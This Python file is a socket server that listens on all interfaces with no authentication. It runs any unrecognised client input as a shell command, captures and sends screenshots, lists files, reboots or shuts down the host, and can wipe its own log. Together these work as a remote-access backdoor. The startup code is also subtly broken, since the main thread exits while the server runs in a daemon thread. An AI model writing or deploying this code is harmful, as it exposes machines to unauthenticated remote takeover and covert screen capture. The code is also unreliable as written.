import socket
import threading
import os
import subprocess
import psutil
from datetime import datetime
from PIL import ImageGrab

def log_action(action):
    with open("server_log.txt", "a") as log_file:
        log_file.write(f"{datetime.now()} - {action}\n")

def handle_client(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode().strip()
            if not command:
                break
            log_action(f"Received command: {command}")
            
            if command.lower() == 'exit':
                client_socket.send(b"Connection closed.")
                log_action("Client disconnected.")
                break
            elif command.lower() == 'sysinfo':
                sys_info = f"CPU: {psutil.cpu_percent()}%\n" \
                           f"Memory: {psutil.virtual_memory().percent}%\n" \
                           f"Disk: {psutil.disk_usage('/').percent}%"
                client_socket.send(sys_info.encode())
            elif command.lower().startswith('list_files'):
                path = command.split(" ", 1)[1] if " " in command else "."
                if os.path.exists(path):
                    files = "\n".join(os.listdir(path))
                    client_socket.send(files.encode())
                else:
                    client_socket.send(f"Path {path} does not exist.".encode())
            elif command.lower() == 'take_screenshot':
                screenshot_path = "screenshot.png"
                ImageGrab.grab().save(screenshot_path)
                with open(screenshot_path, "rb") as file:
                    client_socket.sendall(file.read())
                log_action("Screenshot sent to client.")
            elif command.lower() == 'restart':
                client_socket.send(b"Restarting system...")
                log_action("System restart triggered.")
                subprocess.run(["sudo", "reboot"])
            elif command.lower() == 'shutdown':
                client_socket.send(b"Shutting down system...")
                log_action("System shutdown triggered.")
                subprocess.run(["sudo", "shutdown", "now"])
            elif command.lower() == 'view_logs':
                if os.path.exists("server_log.txt"):
                    with open("server_log.txt", "r") as log_file:
                        client_socket.send(log_file.read().encode())
                else:
                    client_socket.send(b"No logs available.")
            elif command.lower() == 'clear_logs':
                open("server_log.txt", "w").close()
                client_socket.send(b"Logs cleared successfully.")
                log_action("Server logs cleared.")
            else:
                try:
                    output = subprocess.check_output(command, shell=True, text=True)
                    client_socket.send(output.encode())
                except Exception as e:
                    error_message = f"Error executing command: {e}"
                    client_socket.send(error_message.encode())
        except Exception as e:
            log_action(f"Error: {e}")
            break

def start_server(host='0.0.0.0', port=5000):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    log_action(f"Server started on {host}:{port}. Waiting for connections...")

    while True:
        client_socket, client_address = server_socket.accept()
        log_action(f"Connection established with {client_address}")
        handle_client(client_socket)
        client_socket.close()
        log_action(f"Connection closed with {client_address}")

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    print("Server is running...")
